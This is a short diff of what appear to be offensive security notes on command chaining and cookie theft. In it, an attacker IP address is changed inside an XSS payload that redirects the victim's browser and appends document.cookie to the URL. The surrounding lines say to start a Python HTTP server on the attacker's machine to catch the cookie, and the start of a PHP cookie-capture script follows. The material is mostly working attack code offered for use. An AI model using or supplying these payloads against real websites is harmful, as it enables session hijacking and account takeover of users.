@@ -221,7 +221,7 @@ Run the following to chain/stack our arbitrary command
 run this on your op to catch the cookie when it's  ran on the website and have it sent to your pc.
 python3 -m http.server
 
-<script>document.location="http://10.50.40.200:8000/"+document.cookie;</script>  
+<script>document.location="http://10.50.40.254:8000/"+document.cookie;</script>  
 
 <?php
 $cookie = $_GET["username"]
